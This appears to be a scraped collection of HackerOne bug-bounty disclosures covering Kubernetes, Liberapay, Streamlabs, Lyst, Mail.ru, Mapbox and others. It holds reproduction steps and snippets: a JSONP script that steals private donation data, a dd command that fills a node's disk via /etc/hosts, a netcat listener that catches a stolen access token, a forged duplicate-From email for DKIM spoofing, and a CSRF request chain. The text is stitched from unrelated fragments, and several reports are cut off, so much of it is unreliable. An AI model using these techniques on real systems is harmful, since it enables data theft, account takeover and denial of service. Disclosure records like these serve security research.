I was having trouble getting a cluster spun up, so I have not managed a live reproduction.

Kubernetes,251-500,0.0,200m-1b,"$1,000.00",Medium,6.0,Man-in-the-Middle,IPv4 only clusters susceptible to MitM attacks via IPv6 rogue router advertisements,"champtar  submitted a report to Kubernetes.Mar 15th (3 years ago)This bug report mostly concerns the default CNI plugins (https://github.com/containernetworking/plugins) but I believe affects many K8S clusters.
Because the CNI team still doesn’t provide an explicit way to report security bugs, I hope the K8S security team doesn’t mind doing the coordination job again as was done for CVE-2019-9946.
I understand this is out of scope for this bounty, and I understand if you want to close this report and prefer that I resend it via email to security@kubernetes.io or other.
Summary:
In many K8S network configurations the container network interface is a virtual ethernet link going to the host (veth interface). In this configuration, an attacker able to run a process as root in a container can send and receive arbitrary packets to the host using the CAP_NET_RAW capability (present in default configuration).
In a K8S cluster with an IPv4 internal network, if IPv6 is not totally disabled on the host (via ipv6.disable=1 on the kernel cmdline), it will be either unconfigured or configured on some interfaces, but it’s pretty likely that ipv6 forwarding is disabled, ie /proc/sys/net/ipv6/conf//forwarding == 0. Also by default, /proc/sys/net/ipv6/conf//accept_ra == 1. The combination of these 2 sysctls means that the host accepts router advertisements and configure the IPv6 stack using them.
By sending “rogue” router advertisements, an attacker can reconfigure the host to redirect part or all of the IPv6 traffic of the host to the attacker controlled container.
Even if there was no IPv6 traffic before, if the DNS returns A (IPv4) and AAAA (IPv6) records, many HTTP libraries will try to connect via IPv6 first then fallback to IPv4, giving an opportunity to the attacker to respond.
If by chance you also have on the host a vulnerability like last year’s RCE in apt (CVE-2019-3462), you can now escalate to the host.
As CAP_NET_ADMIN is not present by default in K8S pods, the attacker can’t configure the IPs they want to MitM, they can’t use iptables to NAT or REDIRECT the traffic, and they can’t use IP_TRANSPARENT. The attacker can however still use CAP_NET_RAW and implement a tcp/ip stack in user space.
This report includes a POC based on smoltcp (https://github.com/smoltcp-rs/smoltcp) that sends router advertisements and implements a dummy HTTP server listening on any IPv6 addresses.
This vulnerability can easily be fixed by setting accept_ra = 0 by default on any interface managed by CNI / K8S.

Summary:
kubeabdm's delete command takes as input either a bootstrap token ID, or a full token. Before determining whether the input is just an id or a full token, kubeadm logs the input using klog. If the deletion fails, the token would remain valid. An attacker who has access to the logs could use it to perform actions that require a bootstrap token, such as creating a cluster or joining nodes to an existing cluster.

Summary:
Malicious clients can potentially DOS a kubelet by sending a high amount of specially crafted requests to the kubelet's HTTP server. 
For each request the kubelet updates/sets 3 metrics:

kubelet_http_requests_total (Counter)
kubelet_http_requests_duration_seconds (Histogram with 7 buckets)
kubelet_http_inflight_requests (Counter)

Each metric has the label path which will contain the path of each request.
It does not matter if the request is authenticated or not - The metrics will be set/updated regardless.
With each unique path, the kubelet creates 16 new time series.
By sending a high amount of requests with random path values, the kubelet's memory usage will grow and eventually the kubelet will get OOM killed.
It's also possible that the kubelet evicts all workloads before being OOM killed (Which might be worse than an OOM kill)

Summary:
This report details 2 ways to man in the middle traffic by:
a) creating a LoadBalancer service and patching the status with the attacked IP
b) creating a ClusterIP service with ExternalIPs set to the attacked IP
For these 2 options, we explore:
1) MITM of IPs external to the cluster (ex: 1.1.1.1)
2) MITM of ClusterIP IP
3) MITM of pod IP
4) MITM of 127.0.0.1
This gives us 8 test cases, that I tested with kube-proxy mode IPVS, iptables, and a GKE cluster (if you need an easier repro than kubespray deployments)

Additional informations:
This work doesn't claim to be exhaustive, here are some limitations:

I didn't attempt to MITM DNS traffic, as it's UDP, it might behave differently than TCP, but pretty sure it works in some cases
I didn't try to reproduce my findings with other kube-proxy replacements (Cilium, ...)
I didn't try to reproduce my findings with Network policies configured
I didn't try to reproduce my findings with services mesh encryption like Istio
I didn't try multiple CNI
I didn't look at IPv6
I didn't try to MITM Loadbalancer IPs with external IPs and vice versa
I didn't fully investigate if having a service that changes ports (443->8443) makes a difference versus a service that doesn't (443->443)

Issues 2/3/4 could be fixed via a blacklist approach, at the API level, loadBalancerIP and externalIPs must not be allowed in the same range as clusterIPs, pods IPs, localhost, nodeIPs, and maybe some other reserved ranged.
Issues 1a/1b are expected behaviours in my opinion. I want to be able to access my LoadBalancer IP from my pods and nodes, so a possible fix here would be a whitelist, and give the rights to real LB controllers to update this whitelist.
We also need to make sure we can't use the same IP as both Loadbalancer IP and external IP.

Impact
An attacker able to create and/or patch services can, depending on the mode of kube-proxy:

MITM traffic destined for IPs external to the cluster (ex: 1.1.1.1)
MITM traffic destined for ClusterIP IP
MITM traffic destined for pod IP

Summary:
Pod files /etc/hosts, /etc/hostname, /etc/resolve.conf are not readonly.
A normal pod running in kubernetes cluster can kil a host through write data to /etc/hosts.
Not only /etc/hosts, but also /etc/resolve.conf and /etc/hostname can do this.
Kubernetes Version:
<=1.18
Component Version:
Docker 19.03
Steps To Reproduce:

use kubectl create a pod like kubectl run 
run kubectl exec -it $POD_NAME -- dd if=/dev/zero of=/etc/hosts count=1000000 bs=10M
run df -h /var/lib/kubelet on host that pod running, you can see the disk avaliable space are decreasing until the disk full.

Kubernetes,251-500,0.0,200m-1b,"$1,000.00",Medium,6.5,Improper Access Control - Generic,Node Validation Admission does not observe all oldObject fields,"ariellima  submitted a report to Kubernetes.Feb 4th (2 years ago)Summary:
The Validating Admission webhook for Node Objects is passing oldObject fields incorrectly on AdmissionReview.Request. It was identified initially in metadata.labels, but a list of impacted fields follows below:
oldNode.Spec.PodCIDRs
oldNode.Spec.ProviderID
oldNode.Spec.ConfigSource
oldNode.Status.Config
oldNode.ObjectMeta
oldNode.Status.Capacity
oldNode.Spec.Unschedulable
oldNode.Status
oldNode.Spec.Taints
Those fields are being set with the same values as the new node object, potentially allowing users to bypass validating admission to update node labels, taints, and others.
Kubernetes Version:
v1.19.x
Component Version:
Validation Webhook for Nodes
Steps To Reproduce:

Create a Validating Webhook Configuration for Node updates
Create an admission Webhook that outputs the content of oldNode and newNode from the admissionReview obejct
Run a patch that changes one of the fields mentioned above.
Look at the log output and compare the old and newObject CRs -- you will notice that the patch you just made appears on the new AND oldObject CRs logged.

Impact
Even though a validating admission webhook thinks that it is restricting actors from mutating certain fields like taints, labels, and schedulability it is not.
Some examples of actions you could perform:

change labels to steer workloads
change labels to prevent scheduling any workload
change taints to push pods off a node",https://hackerone.com/reports/1095612,California,United States,San Francisco,2021,2,4,16,40

Liberapay,1-10,0.0,No value,$50.00,Medium,4.3,Information Disclosure,Exploiting JSONP callback on /username/charts.json endpoint leads to information disclosure despite user's privacy settings,"kapytein  submitted a report to Liberapay.Jun 5th (4 years ago)Hello!
Vulnerability Details
The /username/charts.json endpoint can return a JSONP callback due to the fact that jsonp_dump is used in the file charts.json.spt. It appears that the content of the JSONP request depends on the authentication of the user. If the user enabled the privacy setting which hides the receiving donation data of the user,  a 403 error will be returned unless  the user is authenticated.
This happens here:
Code 114 BytesWrap lines Copy Download1if participant.hide_receiving:
2    if user != participant and not user.is_admin:
3        raise response.error(403)
The vulnerable code is here:
Code 37 BytesWrap lines Copy Download1[---] application/json via jsonp_dump
Basically, a jsonp_dump is unnecessary in this case (I did not notice a case where cross-domain requests need to be done), and it should be replaced with json_dump instead.
How could this be exploited?
This would eventually allow any site to call the JSONP callback, and receive the receiving donation data of the user, despite it's privacy settings. This will lead to unwanted information disclosure.
Proof of Concept
Code 148 BytesWrap lines Copy Download1<script>
2function rip(a) {
3
4alert(JSON.stringify(a[1]));
5
6}
7</script>
8<script src=""https://liberapay.com/~153779/charts.json?callback=rip""></script>
Host this file, visit the site authenticated and it will print out the first row in the JSON Array. If you have not received any donation through LIbrapay so far, an empty JSON array will be returned.
Impact
This will lead to unwanted information disclosure due to the fact that privacy settings of the user will be ignored.",https://hackerone.com/reports/361951,No value,No value,No value,2018,6,5,2,23

Due to insufficient access control, hackers were able to obtain hidden lists of others by specifying their internal ID.
● Discovery
I was looking for an interesting endpoint by dynamically intercepting HTTP requests that LINE client made. Then, I found this HTTP request, and I predicted that it could be vulnerable.
Code 361 Bytes1POST /vulnerable/endpoint HTTP/1.1

As a result, this endpoint was vulnerable, so I wondered how this could be used. The endpoint included the user's internal ID, name, and profile picture URL in the response.
● Exploit / Impact
Theoretically, hackers could disclose a huge social graph by chaining internal IDs in the response.
LINE Messenger is a closed SNS, so disclosing private relationships may undermine users' confidence.
● Experience
LINE quickly fixed the vulnerability with excellent teamwork before such an incident occurred. Thank you for keeping LINE users safe✨",https://hackerone.com/reports/853894,Tokyo,Japan,Tokyo,2020,4,20,1,48

Lob,101-250,0.0,1m-10m,"$1,500.00",Critical,9.8,Use After Free,Old WebKit HTML agent in Template Preview function has multiple known vulnerabilities leading to RCE,"ajxchapman  submitted a report to Lob.Apr 2nd (4 years ago)Summary:
The Template Preview function allows users to render arbitrary HTML to a PDF document, this includes the ability to execute arbitrary Javascript. The HTML agent used to render the HTML is based on an old version of WebKit which has known security issues, for which public exploits and Proof of Concepts (PoCs) are available. Exploitation of these issues could lead to Remote Code Execution (RCE) on the AWS instance running the HTML renderer, potentially exposing sensitive user or configuration data.
Details:
The WebKit agent version appears to date from ~2013 based on version numbers and feature availability. This version has multiple known vulnerabilities for which many public exploits are available.
Specifically, the following resources demonstrate exploiting a memory leak and a Use after Free (UaF) issue to gain Remote Code Execution in a vulnerable WebKit version:

https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit/blob/master/expl.js
https://github.com/AlexAltea/orbital/blob/master/tools/dumper/exploit/500/index.html

These exploits are targeted at a different version and system (PlayStation 4) so do not directly result in RCE on against the Template Preview WebKit agent. However, the techniques they use can be translated to target the WebKit agent used. 
I have translated the two key exploit techniques used in the above exploits to target the Template Preview agent (see Steps to Reproduce). The first PoC I have produced exploits the memory leak to disclose internal process heap memory pointers. The second PoC demonstrates the UaF issue by completely crashing the Template Preview WebKit agent.
It should be noted at this point I have not invested the time to fully translate these exploits to gain RCE on Template Preview WebKit agent. Based on the results observed, successfully exploiting the memory leak and UaF, it would just be a matter of effort to achieve this.
Steps To Reproduce:
To demonstrate the identified memory leak issue create a new HTML Template with the following contents:

Once the template is created, preview the template using the Preview function. This will cause the backend WebKit agent to render the given HTML page hosted at http://www.webhooks.pw/static/pocs/78d20a750cd8c80697746e60cfde103773ea1c02/. 
leak.html exploits the memory leak vulnerability to extract a 64bit pointer into the process heap where JSObjects are created. The screenshots below show the output of two separate runs of this template:

LocalTapiola,1001-5000,0.0,over-1b,"$3,000.00",Critical,9.0,Cross-site Scripting (XSS) - Generic,Blind Stored XSS Against Lahitapiola Employees - Session and Information leakage,"putsi  submitted a report to LocalTapiola.Aug 15th (6 years ago)Hi,
I am pretty sure that I found a vulnerability similar to https://hackerone.com/reports/135154.
An adversary can use the ""Lähetä viesti""-functionality of the LähiTapiola Asiakassalkku to send a malicious file. When the customer service opens the file, an XSS will execute and will leak user IP address and Lähitapiola session cookies and also for example the ""tapiola.cem.uid"" which I suspect is the username of the employee (e.g. ""██████████"").
Steps to reproduce:

Log in to the Lähitapiola customer site (https://www.lahitapiola.fi/henkilo/asiakaspalvelu/asioi-verkossa/kirjaudu-verkkoon).
Navigate to the ""Lähetä viesti""-page (https://verkkopalvelu.tapiola.fi/a2/AskoWeb/faces/sivut/viesti/laheta.xhtml).
Fill the fields with anything you want and click the ""Lataa liite""-button and upload a malicious file (see the attached file kirje.txt).
Send the message.
Navigate to ""Postilaatikko"" and make sure that the message was sent and that the attachment is properly uploaded (see the attached image1.png and image2.png).
The attached kirje.txt contains a SVG image file which is modified to contain malicious javascript that sends an AJAX-request to attacker's server (mine) and adds website cookies to the URL as GET-parameter. As the Lähitapiola employees are probably using Internet Explorer, the IE will sniff the MIME type from the file and open it as SVG instead of text/plain and it will trigger the XSS.

Proof of exploitation
See the attacked file xsspoc.txt for an proof. The file is from my nginx-server logs and in the file you can see that an Lahitapiola employee (notice the IP-address) has opened the attachment and it triggered the XSS which sent the employees cookies to my server. 3 attachments:F112342: kirje.txtF112343: image2.pngF112344: image1.pngSummary by putsiPublic Service Announcement
Fellow hackers, please don't blindly open/execute files that you download from HackerOne reports.
After this report was disclosed, the attached XSS payload-files have contacted my server over 50 times. I even received someone's cookies for some web service.",https://hackerone.com/reports/159498,Espoo,Finland,Espoo,2016,8,15,15,36

LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.
This is not CSRF as there is no identity nor are there any privileges. It's just a link, a brute force link.
Our security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.

LocalTapiola,1001-5000,0.0,over-1b,"$2,100.00",Critical,9.5,Violation of Secure Design Principles,CORS misconfiguration allows to steal customers data ,"muon4  submitted a report to LocalTapiola.May 12th (4 years ago)Summary by muon4I found an interesting bug from the LocalTapiola's verkkopalvelu. This bug was a sitewide CORS misconfiguration. This misconfiguration allowed an attacker to bypass  SOP and get READ and WRITE access to the logged customer's profiles.
After some interesting discussion the program handled the report very well and awarded me reasonable bounty.
The PoC code is quite long because I needed to prove the real impact of this vulnerability so I parsed all the critical customer information and logged it to the console. In the real-life scenario this data would be sent to the attacker's server. 
However here is my PoC code (Yes I know - you could probably do a way cleaner PoC):

Description:
After the victim opens the affected URL (by direct URL or via CSRF), the victim cannot access any of the Tapiola-domains (see the list below).
The vulnerability affects anonymous AND authenticated users.
This full client-side denial-of-service will last until the ""selectedArea""-cookie expires which is about 10 years from the last login. Customer can recover from the condition by deleting the ""selectedArea""-cookie.
List of domains which cannot be used by the client:

As no rate-limiting is setup for this URL - then DoS comes real.
Variants to fix issue##
change default ""admin"" directory name (Security through obscurity)
or apply some password protection to /wp-admin/ url
or apply some rate-limiting (but DDoS is still possible)
Thank you!

Now, considering the domain www.lahitapiolarahoitus.fi, the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below.
POST /xmlrpc.php HTTP/1.1

remediation:
If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.

Logitech,5001-10000,0.0,over-1b,$100.00,Low,2.0,Insecure Direct Object Reference (IDOR),IDOR when creating App on [platform.streamlabs.com/api/v1/store/whitelist] with user_id field,"bugra  submitted a report to Logitech.Sep 16th (2 years ago)Summary:
Hi team,
There is a IDOR when applying to platform.streamlabs.com after loginning.
If you login to platform.streamlabs.com and click Create App. You will see the ""apply form"". And if you submit it, you will see the user_id parameter in JSON data of the apply request. (api/v1/store/whitelist). This parameter is vulnerable for IDOR, you can apply to platform as another accounts.
Also these user_ids are sequential, so any attacker can apply this form with a lot of accounts with random values. Attacker can force the victims' apply forms to be rejected.
## Steps To Reproduce:

Sign-up to platform.streamlabs.com with 2 different accounts (Make sure you didn't apply the apply form before.)
Click Create App and turn on the proxy
Fill in the form and click  Apply
Change the user_id on the JSON data of the request to your another account's ID.
Forward the request.

user_id's are sequential, for finding your user_id you can go to https://platform.streamlabs.com/api/v1/s/user/me
If you see 200 OK in response, that means you submitted the form as victim.
Image F989441: 200.PNG 90.54 KiBZoom in Zoom out Copy Download
Now, the victim can't apply the form again. And if you fill the form with random values. Streamlabs will probably reject the victim's form because of random values.
Impact
Any attacker can apply the platform form with a lot of accounts with random values. So attacker can force the victims' apply forms to be rejected.
I don't know the full impact because I didn't get response for my Platform request yet. Maybe there is more serious impact on this issue but I can't figure it out for now.
Thanks,

Summary:
 I was able as Administrator  to change the account owner access token 
Description:
As Administrator i have high privileges but i have some restricted areas
Image F1278364: Logitech-Admin-priv.png 126.70 KiBZoom in Zoom out Copy Download
For example i got invitation from MrX with Administrator role.
When i navigated to MrX account as administrator i found all the menu items except the settings
Image F1278370: Logitech-PS2.png 89.14 KiBZoom in Zoom out Copy Download
so i tried to navigate to dashboard/#settings and i was able to access MrX's account settings!
Image F1278399: Logitech-P6.png 122.43 KiBZoom in Zoom out Copy Download
I tried to use many features but couldn't but found on API Settings --> API Tokens some cool feature allowed me  to Refresh API Access Token which is part of a lot of requests (will describe on the impact section)
Steps to reproduce:
we need 2 accounts 

MrX (account owner)
MrMax


Using MrX account go to https://streamlabs.com/dashboard#/settings/shared-access and create invitation with administration role, Copy the link
Open the link on your other browser which you are logged in as MrMax, accept the invite then click on MrXto access his account
Image F1278374: Logitech-PS1.png 99.81 KiBZoom in Zoom out Copy Download
You will get message on the top says You are currently acting as MrX, click here to return to MrMax. , now navigate to
https://streamlabs.com/dashboard#/settings/api-settings you well see empty Access token field , click on Refresh then yes
Image F1278380: Logitech-P3.png 116.70 KiBZoom in Zoom out Copy Download

Done ^ ^
Impact
The API Access Token is used in most of API requests and a lot of other places e.g.
Image F1278381: Logitech-P4.png 164.49 KiBZoom in Zoom out Copy Download
Here is a list of URLs the token used on , This list represents about 80% of the uses for this token here is one of the uses for this token:
To stream

I must install recording software supports streaming (e.g. OBS Studio..etc.)
To use any of the streamlabs widgets (Alert box , Start goal , The jar ,Tip ticker , Follower goal , View count , Stream boss , Sponsor banner...etc. ) i must have link contains this token 

Image F1278389: Logitech-P5.png 301.28 KiBZoom in Zoom out Copy Download
I want to use this widget i should take this url and paste it on the streaming software to make it visible to the  stream viewers
So as a bad administrator i can change the API Access Token  while MrX is streaming which will stop the above widgets which  revokes the main reason for making the streamlabs application which is widgets to help the streamers.
I am still investigating for more impacts and i will let you know if there is any updates
Best Wishes,

mrmax4o4   posted a comment. Updated Apr 27th (2 years ago)Hi @logi_harsha ,
Thanks for your quick response my point here not it's available to the admins my point is the admin can refresh the access token which is not available through the widgets !
although admin has wide permissions on the account but he don't have the account setting tab on the main menu which means he don't have access to it.
what proves my point is when i navigate to the settings tab as administrator i see everything blank even the access token field and i can't change or even register an app just i can refresh the token which i think you missed it.
In another meaning the admin can see the access token on all widgets yes but the ability to change it could lead to some problem as i explained on the impact section

Thanks,Logitech  rewarded mrmax4o4 with a $100 bounty. Apr 27th (2 years ago)The severity level is correct as Low. An Administrator user is already a significant trusted permission to be granted to an ""Attacker"".

Logitech,5001-10000,0.0,over-1b,$100.00,Medium,5.4,None,Steal any users `access_token` via open redirect in https://streamlabs.com/global/identity?popup=1&r=,"sudi  submitted a report to Logitech.Sep 2nd (about 1 year ago)Heyy there,
After  reading the disclosed report #1178239, I started to look for bypasses but I found that it's restricted to only streamlabs.com and merch.streamlabs.com , providing any other domain or subdomain of streamlabs.com gives an error instead of the 302 redirect.
From wayback machine (https://web.archive.org/), I found a bunch of domains which were  used in the redirect parameter r.
Code 728 BytesWrap lines Copy Download1https://streamlabs.com/global/identity?r=https://darthvapes.tv

10https://streamlabs.com/global/identity?r=https://www.lokenplays.com
11https://streamlabs.com/global/identity?r=https://yagurlbubblezl4d.com
Visiting all these urls in my browser I found that only these 3 domains were allowed (the access_token was sent to this domains)
dragynslair.live
darthvapes.tv
nixxiom.tv
If an authenticated user visits this url, his access_token will be sent to the dragynslair.live domain:
https://streamlabs.com/global/identity?r=https://dragynslair.live/
Image F1433713: BurpSuiteCommunity_SxHPNdXsnP.png 50.13 KiBZoom in Zoom out Copy Download
In this screenshot you can see that the access_token is added as a query parameter.
The most interesting thing about this particular domain is that it is available for registration, which you can verify from here:
https://www.name.com/domain/search/dragynslair.live
Anyone can buy this domain name for $3 , which will allow him to takeover any streamlab's user account
Image F1433718: firefox_ZayRHz2tWl.png 39.95 KiBZoom in Zoom out Copy Download

Steps to reproduce:
As I haven't actually purchased this domain name dragynslair.live , to prove that I can steal the access_token. I will add dragynslair.live to my /etc/hosts file which will point to 127.0.0.1 and a web server wil be running on port 80 locally.
This should be enough to validate this finding.
1.Open your /etc/hosts file and add this line to it , save it
Code 27 BytesWrap lines Copy Download1127.0.0.1  dragynslair.live
2.Now start a web server on port 80 by using this command  sudo nc -lvk 80
3.Open this url https://streamlabs.com/global/identity?popup=1&r=http://dragynslair.live (make sure the user is authenticated)
4.Check the ncat command output you should see the access_token parameter 
Image F1433725: ubuntu_dSh04rREny.png 29.27 KiBZoom in Zoom out Copy Download
This access_token then can be used in the following api endpoints: https://dev.streamlabs.com/reference

Impact
By just sending the url an attacker can steal victim's access_token which can be used in the streamlabs api endpoints.

Access token allows you to access a users' Streamlabs data.
Even though I am able to steal other users access_token by just sending them a url, the severity for this bug is medium?
In report #1178239, in order to steal the access_token the malicious app must be installed on the victim's  mobile.
In my report there is no such limitation, I am able to take control over the whole redirect uri not just the protocol part.
Let me know if any more info is required.

Logitech,5001-10000,0.0,over-1b,$200.00,Medium,4.7,Open Redirect,session takeover via open protocol redirection on streamlabs.com,"f_m  submitted a report to Logitech.Apr 28th (2 years ago)Summary:
Hi Logitech team, on streamlabs.com the endpoint: streamlabs.com/global/identity?popup=1&r=protocol://merch.streamlabs.com redirect any authenticated user to a arbitrary protocol, and it merge the redirect link with an access_token.
Image F1281409: redir.png 155.20 KiBZoom in Zoom out Copy Download
this means that if a malicious app that handle the protocol is installed on the device the access token will be steal by this app and consequently a session takeover is possible on multiple streamlabs domain 
Steps To Reproduce:

once authenticated on streamlabs.com go to: streamlabs.com/global/identity?popup=1&r=test://merch.streamlabs.com and intercept the request in burp.
grab the redirection link in the response(as a malicious app can do, especially on mobile systems), change the protocol to https and open it in a private browser window
finally in the private browser window go to: https://merch.streamlabs.com/ or https://streamlabs.com/<your_store_name> or https://streamlabs.com/my-portal?origin=cs

in every case you will be logged in as the victim

Lyst,101-250,0.0,50m-100m,$100.00,Low,2.0,Information Disclosure,Bypassing one-time checkout router page (revealing payment information),"tolo7010  submitted a report to Lyst.Sep 23rd (5 years ago)Description:
When user submits for a checkout, the checkout router page /checkout-router/[ID]/ is accessible only once, which can be bypassed by crafting the checkout [ID] in cookie basket_key send to the page /new/checkout/order/. combining with brute-force attack, if the ID is valid a result page shown from any user that made the payment. this disclosure contains items ordered, prices, customer name, billing address, email address, phone number... This attack require no authentications, and no rate-limit in brute-forcing checkout [ID]
Step to reproduce:

Go to https://www.lyst.com/cart/
Assuming your shopping bag is not empty, click ""checkout securely"" or https://www.lyst.com/cart/verify/set-password/
Confirming account by entering email & password.
Upon click ""checkout"", use burp to intercept the request.

You will get a redirection link to the checkout router, the form of the url is:
https://checkout.lyst.com/checkout-router/[ID]/
where [ID] is the 19 digit number identification - the link redirects again to https://checkout.lyst.com/new/checkout/order/ which you will provide billing information.
Now the point is the link https://checkout.lyst.com/checkout-router/[ID]/ is accessible only once, you will get ""This page doesn't exist"" message if you try to request the link. To bypass this, we can craft cookie value key basket_key=[ID] in request to the endpoint /new/checkout/order/.
In this report I use base key 7092456849791607456 which I created from my own check out (filled with billing address).
I use chrome extension EditThisCookie in the attached image, here are the same result from burp (also image attached):

Lyst,101-250,0.0,50m-100m,$150.00,Medium,4.3,Cross-Site Request Forgery (CSRF),CSRF - Adding unlimited number of saved items via GET request,"inhibitor181  submitted a report to Lyst.Feb 13th (6 years ago)Hello, I have found a way of potentially adding thousands of items to the saved items list by using a GET request.
POC
Code 164 BytesWrap lines Copy Download1GET /email-capture/stock-alert/93543518/?return_url=/email-capture/stock-alert/91703404/?return_url=/email-capture/stock-alert/89201857/ HTTP/1.1
2Host: www.lyst.com
By adding a stock alert notification to an item, the respective item is automatically added in the saved list and because this is a GET request, there is no CSRF token/protection here.
IMPACT
Because this is done via GET request it is very easy to add thousands of products in the target user account by making one or both of these:

Chain your internal redirect requests (shown in POC)
Simply embed 1000x 1px image that with the target link (of course different product id per image)

Because of the extreme volume of the added items, the attacker can make the target's save list simply unusable (he must then delete 1000 entries and NO ONE will do that). I think a lot of people are taking advantage of the list, so a CSRF here can have a pretty big/annoying impact and you could loose clients.

I would disagree, it would deteriorate trust in Lyst though.mr_edwards   posted a comment. Feb 24th (6 years ago)Hey,
the problem is that firefox gives us error message with To protect your information from being stolen this line.
Which when a user will read that my information is being stolen then why did she trust, as we can see that this domain w.lyst.co.uk seems to be legitimate to user, and as lyst is a shopping website and also need some confidential information of user like Name, Address, Phone numbers, AND main things and very confidential infos are Credit Card Number, Name on credit card , CVV, Expiry date and this things are all related to money so if a legitimate browser show this information then this will break trust of user from you.
I hope you understand.

If any researcher found an issue, you should respect, and give him reward if issue is legitimate.

The subdomain storybook.lystit.com had an CNAME record pointing to an unclaimed S3 bucket. This is a high severity security issue because an attacker can register the bucket on AWS and therefore can serve her own content on the subdomain. This allows for various attacks.

The dangling CNAME record of storybook.lystit.com is pointing to ███████ and the bucket which could not be found was: ""storybook.lystit.com"". I was able to register a S3 bucket with this name in AWS. After enabling static website hosting I was able to takeover the subdomain and serve arbitrary content.

Load the request into turbo intruder to make finding it easier. This will in affect server users with my error page causing DOS.

Mail.ru,1001-5000,0.0,200m-1b,$150.00,Medium,5.0,Improper Authentication - Generic,An implementation flaw in Mail.ru can be exploited for DKIM signature spoofing and email spoofing,"jianjun  submitted a report to Mail.ru.Nov 8th (3 years ago)Domain, site, application
https://e.mail.ru
Quick note: this report is different from my previous report (Report #727233) , and is not policy configuration or enforcement issue as well.
TL;DR
This report disclosure an implementation bug, which chains multiple features in the Mail.ru server to bypass Mail.ru sender authentication and forge the target website's DKIM signature. 
Here is a demo video to impersonate admin@accounts.mail.ru on Mail.ru. Mail.ru shows the spoofing message passes both DKIM and DMARC authentication. 
Video link: https://drive.google.com/open?id=1X3-TpaLnMZTpJOB3FzWt4K4SB1T3NQc9
Problem explanation
The threat model of this attack is same-domain spoofing, which means the attacker who has an account on the target email services and tries to impersonate another user's address (e.g., administrator) of the same domain.  
The spoofing attack proceeds in two phases. First, the attacker uses their account to email themselves through the email provider server. In the email, the attacker can create deceptive content in the email body, Subject header and To header, but not the From header given the Mail.ru's strict validation. When the Mail.ru server sends the message, it attaches its DKIM signature to the message.
Second, the attacker adds an extra From header with another user’s address to the DKIM-signed message and resends it to a victim. When the victim’s email server receives the message, its DKIM component may verify the original From header, and the message passes both DKIM and DMARC verification, while the MUA may show the fake From header.
The problem in the second step is that the Mail.ru server has strict message validation on the incoming messages, and rejects messages with multiple From headers. So we need another trick to bypass the validation. Here is the message we crafted in the video: (Note that the message has two From headers. In the first one, there is whitespace between the From and colon.)
Code 109 BytesWrap lines Copy Download1From : Mail.ru Team <admin@accounts.mail.ru>
2From: <attacker@mail.ru>
3To: <victim@mail.ru>
4
5Dear customer ...
 Mail.ru verifies the second one, and generate ""pass"" results for both DKIM and DMARC authentication, but Mail.ru web interface displays it as admin@accounts.mail.ru.
Steps to reproduce
I skipped the phase one because I have generated a spoofing message with my Mail.ru account and embed it into my scripts. If you want to reproduce the phase one, please let me know.


Download the tool I used in the demo video:  https://github.com/chenjj/espoofer


Download the file ambiguous-replay-mailru.py into the main directory: https://drive.google.com/open?id=1LuoqhWfcW3bfo5dmgZfchJuoRdDXXVOB


Change the ""victim_address"" in ambiguous-replay-mailru.py to a Mail.ru recipient address.


Run the code: python3 ambiguous-replay-mailru.py


How to fix
There may be two options can be applied to prevent this attack:
1) Email server and client should be consistent in interpreting the spoofing message.
2) Mail.ru server could use the ""oversign"" solution (suggested in RFC 6376 section 8.15) for outgoing messages,  i.e., repeat important headers, to prevent replay attacks, such as using “h=from:from:subject:subject:to:to. . ."". This will prevent attackers from replaying Mail.ru DKIM signatures on other email providers.  According to our testing, Yahoo.com has adopted this solution.
Impact
A regular user of email services may send DKIM-signed messages as any other user (e.g., administrator) of the domain to a Mail.ru recipient.
Apart from Mail.ru,  this attack can also be used to forge DKIM signatures of other email services, such as Gmail, Outlook, and other public or private services, to a Mail.ru recipient",https://hackerone.com/reports/731878,Moscow,Russia,Moscow,2019,11,8,1,7
Mapbox,501-1000,0.0,10m-50m,$400.00,No value,0.0,Denial of Service,Denial of service in account statistics endpoint,"apok  submitted a report to Mapbox.May 4th (7 years ago)Hi Mapbox,
I know that your guidelines explicitly say that Denial of Service coinditions are not in scope and should not be attempted, but I maintained the testing between adequate parameters so as to not to create excessive load on your backend. I also sent an email to security@mapbox.com prior to submitting this report and Alex Ulsh and he or she (Sorry, can't know which since Alex is a unisex name hahaha) told me that this could be an exception.
The vulnerability relies on the https://www.mapbox.com/core/statistics/v1/apokh11/account endpoint, it seems that by modifying the ""period"" parameter to an arbitrary value, the amount of data returned increases probably without any limit, furthermore, if the interval is set to ""hour"" instead of ""day"", it is possible to increase the amount of data returned even further. To avoid affecting the availability of the server, I limited my testing to a small period, which still returned around 350 kb of data.
The amount of data can also be increased if the end date of the period requested is set to a point in the future.
To reproduce:
1) Create an account or login to an existing account.
2) Access this URL: https://www.mapbox.com/core/statistics/v1/apokh11/account?interval=day&period=1461766083142%2C1462370883143&metrics=countries%2Cbrowsers%2Chosts%2Cmaps%2Cversion&services=mapview%2Ctile%2Cstatic%2Cgeocode%2Cpermanentgeocode%2Cdirections%2Csurface&_=1462370883155
3) Observe that the amount of data returned is around 2.5 Kb.
4) Modify the ""interval"" parameter to ""hour"" and the ""Period"" parameter to, for example ""1451766083142,1462370883143""
5) Observe that the amount of data returned increased to 372 Kb. 
Not tested: If the period is long enough, the amount of time taken to answer the request will probably be increased as well.
Implication: A malicious individual could leverage this feature by asking for extended periods to cause high loads on the backend, which in turn could affect the availiability of the service.
Recommendation: Limit the period length to an amount established by the business logic, so as to mitigate the possibility of using this functionality with malicious intent.
Let me know if you require any additional tests and/or information.

Mapbox,501-1000,0.0,10m-50m,"$1,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Persistent cross-site scripting (XSS) in map attribution,"ph3t  submitted a report to Mapbox.Apr 2nd (8 years ago)Hello,
I have found a Persistent Cross Site Scripting vulnerability when using a custom style uploaded by myself.
Mapbox Studio allows create and upload styles for your maps. So if we create a new style with javascript code as attribution value it will be executed when loading a map that uses our evil style. I used the following javascript code for testing:

